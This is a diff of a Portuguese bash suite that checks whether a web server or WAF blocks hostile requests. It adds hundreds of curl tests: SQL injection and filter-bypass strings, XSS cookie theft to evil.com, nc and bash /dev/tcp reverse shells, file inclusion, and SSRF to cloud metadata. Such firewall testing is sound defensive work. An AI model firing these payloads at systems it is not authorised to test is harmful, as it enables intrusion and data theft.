@@ -1,13 +1,13 @@
 #!/bin/bash
 #==============================================================================
 # HTTP Header Security Testing Suite - EXPANDED VERSION
-# Versão: 5.1.0
+# Versão: 6.0.0
 # Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
-#            Inclui 60+ categorias de testes e 1650+ payloads de ataque
+#            Inclui 60+ categorias de testes e 2000+ payloads de ataque
 #==============================================================================
 
 set -uo pipefail
-VERSION="5.1.0"
+VERSION="6.0.0"
 
 # Cores
 RED='\033[0;31m'
@@ -29,7 +29,41 @@ URL=""
 UA=""
 FILTER="all"  # all, pass, fail
 WITH_PORTS=false  # Testes de portas são lentos, só executar com flag explícita
+SPEED=4  # Velocidade de teste (1-5): 1=muito lento, 4=rápido (padrão), 5=paralelo
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+# Paralelização para velocidade 5
+PARALLEL_JOBS=0
+MAX_PARALLEL=2  # Número de requests paralelos na velocidade 5
+
+# Arquivos temporários para contagem thread-safe
+TEMP_DIR=$(mktemp -d)
+PASS_FILE="$TEMP_DIR/passed"
+FAIL_FILE="$TEMP_DIR/failed"
+TOTAL_FILE="$TEMP_DIR/total"
+OUTPUT_LOCK="$TEMP_DIR/output.lock"
+echo "0" > "$PASS_FILE"
+echo "0" > "$FAIL_FILE"
+echo "0" > "$TOTAL_FILE"
+
+# Limpeza ao sair
+cleanup() {
+    rm -rf "$TEMP_DIR" 2>/dev/null
+}
+trap cleanup EXIT
+
+# Delays baseados na velocidade (em segundos)
+# Speed 1: 1s, Speed 2: 500ms, Speed 3: 100ms (padrão), Speed 4: 0ms, Speed 5: paralelo
+get_delay() {
+    case $SPEED in
+        1) echo "1" ;;      # Muito lento - 1 segundo
+        2) echo "0.5" ;;    # Lento - 500ms
+        3) echo "0.1" ;;    # Padrão - 100ms
+        4) echo "0" ;;      # Rápido - sem delay
+        5) echo "0" ;;      # TURBO - paralelo
+        *) echo "0.1" ;;
+    esac
+}
 
 # User-Agents disponíveis
 USER_AGENTS=(
@@ -63,10 +97,10 @@ USER_AGENTS=(
 
 show_banner() {
     echo -e "${CYAN}"
-    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
+    echo "╔════════════════════════════════════════════════════════════════════════════╗"
     echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED        ║"
-    echo "║                     850+ Security Tests Available                         ║"
-    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
+    echo "                     2000+ Security Tests Available                         ║"
+    echo "╚══════════════════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
 }
 
@@ -74,52 +108,130 @@ test_curl() {
     local description="$1"
     local expected_behavior="$2"
     shift 2
+    local curl_args=("$@")
     
-    TOTAL_TESTS=$((TOTAL_TESTS + 1))
-    local response
-    response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$@" 2>/dev/null)
-    # Se curl falhar ou retornar vazio, usar 000
-    [[ -z "$response" ]] && response="000"
-    
-    local status_icon color result_text
-    
-    if [ "$expected_behavior" == "allow" ]; then
-        # Para requests que devem ser PERMITIDOS
-        if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ]; then
-            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
-        elif [[ "$response" =~ ^[45] ]] || [ "$response" == "000" ]; then
-            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
+    # Função interna que executa o teste
+    _run_test() {
+        local desc="$1"
+        local expected="$2"
+        shift 2
+        
+        local response
+        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$@" 2>/dev/null)
+        [[ -z "$response" ]] && response="000"
+        
+        local status_icon color result_text passed=0 failed=0
+        
+        if [ "$expected" == "allow" ]; then
+            if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ]; then
+                color="${GREEN}"; status_icon="✓"; result_text="PASS"; passed=1
+            elif [[ "$response" =~ ^[45] ]] || [ "$response" == "000" ]; then
+                color="${RED}"; status_icon="✗"; result_text="FAIL"; failed=1
+            else
+                color="${YELLOW}"; status_icon="?"; result_text="WARN"
+            fi
         else
-            color="${YELLOW}"; status_icon="?"; result_text="WARN"
+            if [ "$response" == "000" ]; then
+                color="${GREEN}"; status_icon="✓"; result_text="PASS (444)"; passed=1
+            elif [ "$response" == "200" ] || [ "$response" == "404" ]; then
+                color="${RED}"; status_icon="✗"; result_text="FAIL"; failed=1
+            elif [[ "$response" =~ ^[45] ]]; then
+                color="${GREEN}"; status_icon="✓"; result_text="PASS"; passed=1
+            else
+                color="${YELLOW}"; status_icon="?"; result_text="WARN"
+            fi
+        fi
+        
+        # Retornar resultados para o processo pai
+        echo "$passed:$failed:$status_icon:$result_text:$response:$desc"
+    }
+    
+    if [ "$SPEED" -eq 5 ]; then
+        # Modo paralelo: executar em background
+        (
+            result=$(_run_test "$description" "$expected_behavior" "${curl_args[@]}")
+            IFS=':' read -r passed failed status_icon result_text response desc <<< "$result"
+            
+            # Atualizar contadores de forma thread-safe usando flock
+            {
+                flock -x 200
+                echo $(($(cat "$TOTAL_FILE") + 1)) > "$TOTAL_FILE"
+                [ "$passed" -eq 1 ] && echo $(($(cat "$PASS_FILE") + 1)) > "$PASS_FILE"
+                [ "$failed" -eq 1 ] && echo $(($(cat "$FAIL_FILE") + 1)) > "$FAIL_FILE"
+            } 200>"$OUTPUT_LOCK"
+            
+            # Aplicar filtro de exibição
+            local should_display=true
+            if [ "$FILTER" = "pass" ] && [[ "$result_text" != PASS* ]]; then
+                should_display=false
+            elif [ "$FILTER" = "fail" ] && [ "$result_text" != "FAIL" ]; then
+                should_display=false
+            fi
+            
+            if [ "$should_display" = true ]; then
+                if [[ "$result_text" == PASS* ]]; then
+                    printf "  ${GREEN}[%s]${NC} %-55s ${GREEN}%s${NC} (HTTP %s)\n" "$status_icon" "$desc" "$result_text" "$response"
+                elif [ "$result_text" == "FAIL" ]; then
+                    printf "  ${RED}[%s]${NC} %-55s ${RED}%s${NC} (HTTP %s)\n" "$status_icon" "$desc" "$result_text" "$response"
+                else
+                    printf "  ${YELLOW}[%s]${NC} %-55s ${YELLOW}%s${NC} (HTTP %s)\n" "$status_icon" "$desc" "$result_text" "$response"
+                fi
+            fi
+            [ -n "$OUTPUT_FILE" ] && echo "[${result_text}] ${desc} - HTTP ${response}" >> "$OUTPUT_FILE"
+        ) &
+        
+        # Controlar número máximo de jobs paralelos
+        PARALLEL_JOBS=$((PARALLEL_JOBS + 1))
+        if [ $PARALLEL_JOBS -ge $MAX_PARALLEL ]; then
+            wait -n 2>/dev/null || wait
+            PARALLEL_JOBS=$((PARALLEL_JOBS - 1))
         fi
     else
-        # Para requests que devem ser BLOQUEADOS
-        # HTTP 000 = conexão fechada (Nginx 444) = BLOQUEIO BEM SUCEDIDO
-        # HTTP 4xx (exceto 404) = BLOQUEIO BEM SUCEDIDO
-        # HTTP 200 ou 404 = FALHA (não bloqueou)
-        if [ "$response" == "000" ]; then
-            color="${GREEN}"; status_icon="✓"; result_text="PASS (444)"; PASSED_TESTS=$((PASSED_TESTS + 1))
-        elif [ "$response" == "200" ] || [ "$response" == "404" ]; then
-            color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
-        elif [[ "$response" =~ ^[45] ]]; then
-            color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
+        # Modo sequencial (velocidades 1-4)
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        local response
+        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${curl_args[@]}" 2>/dev/null)
+        [[ -z "$response" ]] && response="000"
+        
+        local status_icon color result_text
+        
+        if [ "$expected_behavior" == "allow" ]; then
+            if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ]; then
+                color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
+            elif [[ "$response" =~ ^[45] ]] || [ "$response" == "000" ]; then
+                color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
+            else
+                color="${YELLOW}"; status_icon="?"; result_text="WARN"
+            fi
         else
-            color="${YELLOW}"; status_icon="?"; result_text="WARN"
+            if [ "$response" == "000" ]; then
+                color="${GREEN}"; status_icon="✓"; result_text="PASS (444)"; PASSED_TESTS=$((PASSED_TESTS + 1))
+            elif [ "$response" == "200" ] || [ "$response" == "404" ]; then
+                color="${RED}"; status_icon="✗"; result_text="FAIL"; FAILED_TESTS=$((FAILED_TESTS + 1))
+            elif [[ "$response" =~ ^[45] ]]; then
+                color="${GREEN}"; status_icon="✓"; result_text="PASS"; PASSED_TESTS=$((PASSED_TESTS + 1))
+            else
+                color="${YELLOW}"; status_icon="?"; result_text="WARN"
+            fi
         fi
+        
+        # Aplicar filtro de exibição
+        local should_display=true
+        if [ "$FILTER" = "pass" ] && [ "$result_text" != "PASS" ]; then
+            should_display=false
+        elif [ "$FILTER" = "fail" ] && [ "$result_text" != "FAIL" ]; then
+            should_display=false
+        fi
+        
+        if [ "$should_display" = true ]; then
+            printf "  ${color}[%s]${NC} %-55s ${color}%s${NC} (HTTP %s)\n" "$status_icon" "$description" "$result_text" "$response"
+        fi
+        [ -n "$OUTPUT_FILE" ] && echo "[${result_text}] ${description} - HTTP ${response}" >> "$OUTPUT_FILE"
+        
+        # Aplicar delay baseado na velocidade
+        local delay=$(get_delay)
+        [ "$delay" != "0" ] && sleep "$delay"
     fi
-    
-    # Aplicar filtro de exibição
-    local should_display=true
-    if [ "$FILTER" = "pass" ] && [ "$result_text" != "PASS" ]; then
-        should_display=false
-    elif [ "$FILTER" = "fail" ] && [ "$result_text" != "FAIL" ]; then
-        should_display=false
-    fi
-    
-    if [ "$should_display" = true ]; then
-        printf "  ${color}[%s]${NC} %-55s ${color}%s${NC} (HTTP %s)\n" "$status_icon" "$description" "$result_text" "$response"
-    fi
-    [ -n "$OUTPUT_FILE" ] && echo "[${result_text}] ${description} - HTTP ${response}" >> "$OUTPUT_FILE"
 }
 
 print_section() {
@@ -252,21 +364,50 @@ test_malicious_cookies() {
 # QUERY STRING MALICIOSA - 10 DE CADA TIPO
 #==============================================================================
 test_malicious_query() {
-    print_section "🔍 TESTES DE QUERY STRING MALICIOSA (50 testes)" "-c query"
+    print_section "🔍 TESTES DE QUERY STRING MALICIOSA (120+ testes)" "-c query"
     
-    print_subsection "SQL Injection (10 variações)"
+    print_subsection "SQL Injection Clássico (25 variações)"
     test_curl "SQLi: OR 1=1" "block" -A "$UA" -Lk "${URL}?id=1%20OR%201=1"
     test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk "${URL}?id=%27%20OR%20%271%27=%271"
     test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20users"
     test_curl "SQLi: DROP TABLE" "block" -A "$UA" -Lk "${URL}?id=1;DROP%20TABLE%20users;--"
     test_curl "SQLi: SLEEP()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20SLEEP(5)"
     test_curl "SQLi: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1;WAITFOR%20DELAY%20%270:0:5%27"
+    test_curl "SQLi: ORDER BY bruteforce" "block" -A "$UA" -Lk "${URL}?id=1%20ORDER%20BY%2010--"
+    test_curl "SQLi: GROUP BY" "block" -A "$UA" -Lk "${URL}?id=1%20GROUP%20BY%201--"
+    test_curl "SQLi: HAVING 1=1" "block" -A "$UA" -Lk "${URL}?id=1%20HAVING%201=1--"
+    test_curl "SQLi: BENCHMARK()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20BENCHMARK(10000000,SHA1(1))"
+    test_curl "SQLi: extractvalue()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20extractvalue(1,concat(0x7e,version()))"
+    test_curl "SQLi: updatexml()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20updatexml(1,concat(0x7e,version()),1)"
+    test_curl "SQLi: CASE WHEN" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20CASE%20WHEN%201=1%20THEN%201%20ELSE%200%20END"
+    test_curl "SQLi: CONCAT()" "block" -A "$UA" -Lk "${URL}?id=-1%20UNION%20SELECT%20CONCAT(user,0x3a,password)%20FROM%20users"
+    test_curl "SQLi: HEX encoding" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%200x73656c656374"
     test_curl "SQLi: LOAD_FILE()" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20LOAD_FILE(%27/etc/passwd%27)"
     test_curl "SQLi: INTO OUTFILE" "block" -A "$UA" -Lk "${URL}?id=1%20INTO%20OUTFILE%20%27/tmp/test.txt%27"
     test_curl "SQLi: INFORMATION_SCHEMA" "block" -A "$UA" -Lk "${URL}?id=1%20UNION%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES"
-    test_curl "SQLi: Blind boolean" "block" -A "$UA" -Lk "${URL}?id=1%20AND%201=1%20AND%20%27a%27=%27a"
+    test_curl "SQLi: Stacked queries" "block" -A "$UA" -Lk "${URL}?id=1;SELECT%20*%20FROM%20users;--"
+    test_curl "SQLi: Boolean Blind" "block" -A "$UA" -Lk "${URL}?id=1%20AND%201=1%20AND%20%27a%27=%27a"
+    test_curl "SQLi: Time-based Blind" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20IF(1=1,SLEEP(5),0)"
+    test_curl "SQLi: Error-based" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20(SELECT%201%20FROM%20(SELECT%20COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x%20FROM%20users%20GROUP%20BY%20x)a)"
 
-    print_subsection "XSS Reflected (10 variações)"
+    print_subsection "SQL Injection WAF Bypass (15 variações)"
+    test_curl "SQLi Bypass: Comentários inline" "block" -A "$UA" -Lk "${URL}?id=1%27/*!50000UNION*//*!50000SELECT*/1,2,3--"
+    test_curl "SQLi Bypass: Tabs" "block" -A "$UA" -Lk "${URL}?id=1%27%09OR%091=1--"
+    test_curl "SQLi Bypass: Mixed case" "block" -A "$UA" -Lk "${URL}?id=1%27%20uNiOn%20SeLeCt%201,2,3--"
+    test_curl "SQLi Bypass: Double encode" "block" -A "$UA" -Lk "${URL}?id=1%2527%2520OR%25201=1--"
+    test_curl "SQLi Bypass: Null bytes" "block" -A "$UA" -Lk "${URL}?id=1%27%00OR%001=1--"
+    test_curl "SQLi Bypass: Scientific notation" "block" -A "$UA" -Lk "${URL}?id=1e0UNION%20SELECT%201,2"
+    test_curl "SQLi Bypass: CHAR()" "block" -A "$UA" -Lk "${URL}?id=1%20AND%20CHAR(49)=1--"
+    test_curl "SQLi Bypass: %23 comment" "block" -A "$UA" -Lk "${URL}?id=1%27%20OR%201=1%23"
+    test_curl "SQLi Bypass: Newline" "block" -A "$UA" -Lk "${URL}?id=1%27%0AOR%0A1=1--"
+    test_curl "SQLi Bypass: HPP" "block" -A "$UA" -Lk "${URL}?id=1&id=%27%20OR%20%271%27=%271"
+    test_curl "SQLi Bypass: Keyword split" "block" -A "$UA" -Lk "${URL}?id=1%27%20UN/**/ION%20SEL/**/ECT%201--"
+    test_curl "SQLi Bypass: LIKE" "block" -A "$UA" -Lk "${URL}?id=1%27%20AND%20user()%20LIKE%20%27root%25%27--"
+    test_curl "SQLi Bypass: REGEXP" "block" -A "$UA" -Lk "${URL}?id=1%27%20AND%20version()%20REGEXP%20%27^5%27--"
+    test_curl "SQLi Bypass: Unicode" "block" -A "$UA" -Lk "${URL}?id=1%EF%BC%87%20OR%201=1--"
+    test_curl "SQLi Bypass: No spaces" "block" -A "$UA" -Lk "${URL}?id=(1)or(1=1)"
+
+    print_subsection "XSS Reflected (20 variações)"
     test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(1)</script>"
     test_curl "XSS: <img onerror>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onerror=alert(1)>"
     test_curl "XSS: <svg onload>" "block" -A "$UA" -Lk "${URL}?q=<svg%20onload=alert(1)>"
@@ -276,9 +417,19 @@ test_malicious_query() {
     test_curl "XSS: <iframe src>" "block" -A "$UA" -Lk "${URL}?q=<iframe%20src=javascript:alert(1)>"
     test_curl "XSS: <input onfocus>" "block" -A "$UA" -Lk "${URL}?q=<input%20onfocus=alert(1)%20autofocus>"
     test_curl "XSS: <details ontoggle>" "block" -A "$UA" -Lk "${URL}?q=<details%20open%20ontoggle=alert(1)>"
+    test_curl "XSS: <marquee onstart>" "block" -A "$UA" -Lk "${URL}?q=<marquee%20onstart=alert(1)>"
+    test_curl "XSS: <video onerror>" "block" -A "$UA" -Lk "${URL}?q=<video><source%20onerror=alert(1)>"
+    test_curl "XSS: <audio onerror>" "block" -A "$UA" -Lk "${URL}?q=<audio%20src=x%20onerror=alert(1)>"
+    test_curl "XSS: <object data>" "block" -A "$UA" -Lk "${URL}?q=<object%20data=javascript:alert(1)>"
+    test_curl "XSS: <embed src>" "block" -A "$UA" -Lk "${URL}?q=<embed%20src=javascript:alert(1)>"
+    test_curl "XSS: <a href>" "block" -A "$UA" -Lk "${URL}?q=<a%20href=javascript:alert(1)>click</a>"
+    test_curl "XSS: <form action>" "block" -A "$UA" -Lk "${URL}?q=<form%20action=javascript:alert(1)><input%20type=submit>"
+    test_curl "XSS: <button onclick>" "block" -A "$UA" -Lk "${URL}?q=<button%20onclick=alert(1)>click"
+    test_curl "XSS: <base href>" "block" -A "$UA" -Lk "${URL}?q=<base%20href=javascript:alert(1)//>"
+    test_curl "XSS: Cookie steal" "block" -A "$UA" -Lk "${URL}?q=<script>new%20Image().src='http://evil.com/?c='+document.cookie</script>"
     test_curl "XSS: DOM based" "block" -A "$UA" -Lk "${URL}?q=<script>document.location='http://evil.com/?c='+document.cookie</script>"
 
-    print_subsection "LFI - Local File Inclusion (10 variações)"
+    print_subsection "LFI - Local File Inclusion (20 variações)"
     test_curl "LFI: ../etc/passwd" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd"
     test_curl "LFI: Com null byte" "block" -A "$UA" -Lk "${URL}?file=../../../etc/passwd%00"
     test_curl "LFI: ....// bypass" "block" -A "$UA" -Lk "${URL}?file=....//....//....//etc/passwd"
@@ -289,8 +440,18 @@ test_malicious_query() {
     test_curl "LFI: expect://" "block" -A "$UA" -Lk "${URL}?file=expect://id"
     test_curl "LFI: Windows path" "block" -A "$UA" -Lk "${URL}?file=C:\\windows\\system32\\drivers\\etc\\hosts"
     test_curl "LFI: /etc/shadow" "block" -A "$UA" -Lk "${URL}?file=../../../etc/shadow"
+    test_curl "LFI: Double URL encode" "block" -A "$UA" -Lk "${URL}?file=%252e%252e%252f%252e%252e%252fetc/passwd"
+    test_curl "LFI: UTF-8 overlong" "block" -A "$UA" -Lk "${URL}?file=..%c0%af..%c0%afetc/passwd"
+    test_curl "LFI: /proc/self/fd/0" "block" -A "$UA" -Lk "${URL}?file=/proc/self/fd/0"
+    test_curl "LFI: zip wrapper" "block" -A "$UA" -Lk "${URL}?file=zip://uploads/shell.jpg%23shell.php"
+    test_curl "LFI: phar wrapper" "block" -A "$UA" -Lk "${URL}?file=phar://uploads/shell.jpg/shell.php"
+    test_curl "LFI: /var/log/nginx" "block" -A "$UA" -Lk "${URL}?file=/var/log/nginx/error.log"
+    test_curl "LFI: /etc/mysql/my.cnf" "block" -A "$UA" -Lk "${URL}?file=../../../etc/mysql/my.cnf"
+    test_curl "LFI: php://fd/0" "block" -A "$UA" -Lk "${URL}?file=php://fd/0"
+    test_curl "LFI: zlib wrapper" "block" -A "$UA" -Lk "${URL}?file=compress.zlib://file.txt"
+    test_curl "LFI: .htaccess" "block" -A "$UA" -Lk "${URL}?file=../../../.htaccess"
 
-    print_subsection "RFI - Remote File Inclusion (10 variações)"
+    print_subsection "RFI - Remote File Inclusion (15 variações)"
     test_curl "RFI: http://evil.com/shell.txt" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt"
     test_curl "RFI: https://evil.com/shell.php" "block" -A "$UA" -Lk "${URL}?file=https://evil.com/shell.php"
     test_curl "RFI: ftp://evil.com/shell" "block" -A "$UA" -Lk "${URL}?file=ftp://evil.com/shell.txt"
@@ -301,8 +462,13 @@ test_malicious_query() {
     test_curl "RFI: With null byte" "block" -A "$UA" -Lk "${URL}?file=http://evil.com/shell.txt%00"
     test_curl "RFI: data:// protocol" "block" -A "$UA" -Lk "${URL}?file=data://text/plain,<?php%20system('id');?>"
     test_curl "RFI: php://input" "block" -A "$UA" -Lk "${URL}?file=php://input"
+    test_curl "RFI: gopher://" "block" -A "$UA" -Lk "${URL}?file=gopher://localhost:6379/_INFO"
+    test_curl "RFI: dict://" "block" -A "$UA" -Lk "${URL}?file=dict://localhost:11211/stats"
+    test_curl "RFI: sftp://" "block" -A "$UA" -Lk "${URL}?file=sftp://evil.com/shell.txt"
+    test_curl "RFI: tftp://" "block" -A "$UA" -Lk "${URL}?file=tftp://evil.com/shell.txt"
+    test_curl "RFI: ldap://" "block" -A "$UA" -Lk "${URL}?file=ldap://evil.com/cn=evil"
 
-    print_subsection "Command Injection (10 variações)"
+    print_subsection "Command Injection (20 variações)"
     test_curl "CMDi: ; id" "block" -A "$UA" -Lk "${URL}?cmd=test;id"
     test_curl "CMDi: | id" "block" -A "$UA" -Lk "${URL}?cmd=test|id"
     test_curl "CMDi: || id" "block" -A "$UA" -Lk "${URL}?cmd=test||id"
@@ -313,6 +479,33 @@ test_malicious_query() {
     test_curl "CMDi: wget evil.com" "block" -A "$UA" -Lk "${URL}?cmd=wget%20http://evil.com/shell.sh"
     test_curl "CMDi: curl evil.com" "block" -A "$UA" -Lk "${URL}?cmd=curl%20http://evil.com/shell.sh"
     test_curl "CMDi: nc reverse shell" "block" -A "$UA" -Lk "${URL}?cmd=nc%20-e%20/bin/sh%20evil.com%204444"
+    test_curl "CMDi: bash -i reverse" "block" -A "$UA" -Lk "${URL}?cmd=bash%20-i%20>%26%20/dev/tcp/evil.com/4444%200>%261"
+    test_curl "CMDi: python reverse" "block" -A "$UA" -Lk "${URL}?cmd=python%20-c%20'import%20socket,subprocess,os'"
+    test_curl "CMDi: perl reverse" "block" -A "$UA" -Lk "${URL}?cmd=perl%20-e%20'use%20Socket'"
+    test_curl "CMDi: Newline bypass" "block" -A "$UA" -Lk "${URL}?cmd=test%0aid"
+    test_curl "CMDi: Carriage return" "block" -A "$UA" -Lk "${URL}?cmd=test%0did"
+    test_curl "CMDi: Tab bypass" "block" -A "$UA" -Lk "${URL}?cmd=test%09id"
+    test_curl "CMDi: whoami" "block" -A "$UA" -Lk "${URL}?cmd=whoami"
+    test_curl "CMDi: uname -a" "block" -A "$UA" -Lk "${URL}?cmd=uname%20-a"
+    test_curl "CMDi: ls -la" "block" -A "$UA" -Lk "${URL}?cmd=ls%20-la"
+    test_curl "CMDi: phpinfo()" "block" -A "$UA" -Lk "${URL}?cmd=php%20-r%20'phpinfo();'"
+
+    print_subsection "SSRF via Query String (15 variações)"
+    test_curl "SSRF: http://127.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1"
+    test_curl "SSRF: http://localhost" "block" -A "$UA" -Lk "${URL}?url=http://localhost"
+    test_curl "SSRF: http://169.254.169.254" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/meta-data/"
+    test_curl "SSRF: http://[::1]" "block" -A "$UA" -Lk "${URL}?url=http://[::1]"
+    test_curl "SSRF: http://0.0.0.0" "block" -A "$UA" -Lk "${URL}?url=http://0.0.0.0"
+    test_curl "SSRF: file:///etc/passwd" "block" -A "$UA" -Lk "${URL}?url=file:///etc/passwd"
+    test_curl "SSRF: gopher://redis" "block" -A "$UA" -Lk "${URL}?url=gopher://localhost:6379/_INFO"
+    test_curl "SSRF: dict://memcached" "block" -A "$UA" -Lk "${URL}?url=dict://localhost:11211/stats"
+    test_curl "SSRF: http://internal" "block" -A "$UA" -Lk "${URL}?url=http://internal.company.local"
+    test_curl "SSRF: IP decimal" "block" -A "$UA" -Lk "${URL}?url=http://2130706433"
+    test_curl "SSRF: IP octal" "block" -A "$UA" -Lk "${URL}?url=http://0177.0.0.1"
+    test_curl "SSRF: IP hex" "block" -A "$UA" -Lk "${URL}?url=http://0x7f.0x0.0x0.0x1"
+    test_curl "SSRF: AWS metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/user-data/"
+    test_curl "SSRF: GCP metadata" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/"
+    test_curl "SSRF: Azure metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/instance"
 }
 
 #==============================================================================
@@ -412,12 +605,60 @@ test_referers_injection() {
 }
 
 #==============================================================================
+# REFERERS ADULT/PORN (Prejudicam SEO - Negative SEO attacks)
+#==============================================================================
+test_referers_adult() {
+    print_section "🔞 TESTES DE REFERERS ADULT/PORN (Prejudicam SEO)" "-c referer-adult"
+    
+    local list_file="${SCRIPT_DIR}/lists/referers-adult.txt"
+    if [ ! -f "$list_file" ]; then
+        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
+        return
+    fi
+    
+    local count=0
+    while IFS= read -r ref || [ -n "$ref" ]; do
+        [ -z "$ref" ] && continue
+        [ "${ref:0:1}" == "#" ] && continue
+        count=$((count + 1))
+        test_curl "Adult #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
+    done < "$list_file"
+    
+    echo -e "\n  ${CYAN}Total Adult referers testados: $count${NC}"
+}
+
+#==============================================================================
+# REFERERS GAMBLING/APOSTAS (Prejudicam SEO - Negative SEO attacks)
+#==============================================================================
+test_referers_gambling() {
+    print_section "🎰 TESTES DE REFERERS GAMBLING/APOSTAS (Prejudicam SEO)" "-c referer-gambling"
+    
+    local list_file="${SCRIPT_DIR}/lists/referers-gambling.txt"
+    if [ ! -f "$list_file" ]; then
+        echo -e "${RED}  Lista não encontrada: $list_file${NC}"
+        return
+    fi
+    
+    local count=0
+    while IFS= read -r ref || [ -n "$ref" ]; do
+        [ -z "$ref" ] && continue
+        [ "${ref:0:1}" == "#" ] && continue
+        count=$((count + 1))
+        test_curl "Gambling #$count: ${ref:0:35}..." "block" -A "$UA" -Lk -e "http://$ref" "$URL"
+    done < "$list_file"
+    
+    echo -e "\n  ${CYAN}Total Gambling referers testados: $count${NC}"
+}
+
+#==============================================================================
 # WRAPPER: TODOS OS REFERERS MALICIOSOS
 #==============================================================================
 test_bad_referers() {
     test_referers_spam
     test_referers_seo_blackhat
     test_referers_injection
+    test_referers_adult
+    test_referers_gambling
 }
 
 #==============================================================================
@@ -472,10 +713,15 @@ test_invalid_host() {
     print_section "🏠 TESTES DE HOST INVÁLIDO" "-c host"
     
     test_curl "Host: 127.0.0.1" "block" -A "$UA" -Lk -H "Host: 127.0.0.1" "$URL"
+    test_curl "Host: 127.0.1" "block" -A "$UA" -Lk -H "Host: 127.0.1" "$URL"
+    test_curl "Host: 127.1" "block" -A "$UA" -Lk -H "Host: 127.1" "$URL"
     test_curl "Host: localhost" "block" -A "$UA" -Lk -H "Host: localhost" "$URL"
     test_curl "Host: vazio" "block" -A "$UA" -Lk -H "Host: " "$URL"
     test_curl "Host: [::1] (IPv6)" "block" -A "$UA" -Lk -H "Host: [::1]" "$URL"
-    test_curl "Host: 0.0.0.0" "block" -A "$UA" -Lk -H "Host: 0.0.0.0" "$URL"
+    test_curl "Host: 0" "block" -A "$UA" -Lk -H "Host: 0" "$URL"
+    test_curl "Host: 0.0" "block" -A "$UA" -Lk -H "Host: 0.0" "$URL"
+    test_curl "Host: 0.0.0" "block" -A "$UA" -Lk -H "Host: 0.0.0" "$URL" 
+    test_curl "Host: 0.0.0.0" "block" -A "$UA" -Lk -H "Host: 0.0.0.0" "$URL"    
     test_curl "Host: 169.254.169.254 (AWS)" "block" -A "$UA" -Lk -H "Host: 169.254.169.254" "$URL"
     test_curl "Host: evil.com" "block" -A "$UA" -Lk -H "Host: evil.com" "$URL"
     test_curl "Host: interno.local" "block" -A "$UA" -Lk -H "Host: interno.local" "$URL"
@@ -1116,14 +1362,295 @@ test_injection_vulnerabilities() {
 }
 
 #==============================================================================
-# OBFUSCATED PAYLOADS - Variantes ofuscadas dos principais ataques (400+ testes)
+# GRAPHQL INJECTION TESTS
+#==============================================================================
+test_graphql_injection() {
+    print_section "🔮 TESTES DE GRAPHQL INJECTION (25 testes)" "-c graphql"
+    
+    print_subsection "GraphQL Introspection"
+    test_curl "GraphQL: __schema" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } } }"}' "${URL}/graphql"
+    test_curl "GraphQL: __type" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ __type(name: \"Query\") { fields { name } } }"}' "${URL}/graphql"
+    test_curl "GraphQL: introspection" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' "${URL}/graphql"
+    
+    print_subsection "GraphQL Injection"
+    test_curl "GraphQL: batch queries" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ users { id email } users { password } }"}' "${URL}/graphql"
+    test_curl "GraphQL: nested query DoS" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ user(id:1) { friends { friends { friends } } } }"}' "${URL}/graphql"
+    test_curl "GraphQL: alias injection" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ user1: user(id:1) { email } user2: user(id:2) { password } }"}' "${URL}/graphql"
